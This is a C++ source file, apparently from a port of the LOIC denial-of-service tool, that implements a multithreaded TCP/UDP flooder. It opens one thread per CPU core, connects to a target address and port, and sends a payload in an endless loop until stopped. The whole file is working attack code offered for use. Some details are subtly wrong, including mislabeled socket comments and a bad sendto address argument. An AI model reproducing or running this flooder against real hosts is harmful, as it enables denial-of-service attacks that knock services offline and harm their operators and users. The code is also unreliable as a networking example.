/*
 * XXPFlooder.cpp
 *
 *  Created on: Dec 4, 2012
 *      Author: ivan
 */

#include "XXPFlooder.h"

namespace loic {


	void XXPFlooder::Start()
	{
		this->flooding = true;

		for(unsigned int i = 0;i<boost::thread::hardware_concurrency();i++)
		{
			boost::thread t(&loic::XXPFlooder::work,this);
		}
	}

	void XXPFlooder::Stop()
	{
		this->flooding = false;
	}

	void XXPFlooder::work()
	{

		struct addrinfo hints;
		struct addrinfo *result, *rp;
		int sfd, s;
		size_t len;
		ssize_t nread;
		char buffer[BUF_SIZE];
		memset(&hints, 0, sizeof(struct addrinfo));
		hints.ai_family = AF_INET;    /* Allow IPv4 or IPv6 */
		hints.ai_flags = 0;

		if(this->protocol == 1)
		{
			hints.ai_socktype = SOCK_STREAM; /* Datagram socket */
			hints.ai_protocol = IPPROTO_TCP;

			try
			{
				//set up the target host

				s = getaddrinfo(ip.c_str(),port.c_str(), &hints, &result);
				if (s != 0) {
					std::cerr<<"getaddrinfo: "<<gai_strerror(s)<<std::endl;

				}


				while(this->flooding)
				{

					for (rp = result; rp != NULL; rp = rp->ai_next) {
						sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);

						if (sfd == -1)
							continue;

						if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
						{
							std::cout<<"successfully connect\n";
							break;                  /* Success */
						}

						close(sfd);
					}

					try
					{
						while(this->flooding)
						{
							this->floodcount++;
							if(write(sfd,data.c_str(),data.length()+1)!= data.length())
							{
								std::cerr<<"partial/failed write"<<std::endl;
							}
							if(delay>0)
							{
								//sleep for the delay
								boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
							}
						}
					}
					catch(std::exception & exe)
					{

					}

				}
			}
			catch(std::exception & exe)
			{

			}
		}
		if(protocol == 2)
		{
			hints.ai_socktype = SOCK_DGRAM; /* Datagram socket */
			hints.ai_protocol = IPPROTO_UDP;

			try
			{
				//set up the target host

				s = getaddrinfo(ip.c_str(),port.c_str(), &hints, &result);
				if (s != 0) {
					std::cerr<<"getaddrinfo: "<<gai_strerror(s)<<std::endl;

				}


				while(this->flooding)
				{

					for (rp = result; rp != NULL; rp = rp->ai_next) {
						sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);

						if (sfd == -1)
							continue;

						if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
						{
							std::cout<<"successfully connect\n";
							break;                  /* Success */
						}

						close(sfd);
					}

					try
					{
						while(this->flooding)
						{
							this->floodcount++;
							if(sendto(sfd,data.c_str(),data.length()+1,0,(struct sockaddr *)rp,sizeof(sockaddr))!= data.length())
							{
								std::cerr<<"partial/failed write"<<std::endl;
							}
							if(delay>0)
							{
								//sleep for the delay
								boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
							}
						}
					}
					catch(std::exception & exe)
					{

					}

				}
			}
			catch(std::exception & exe)
			{

			}
		}

	}
			/* namespace loic */
}
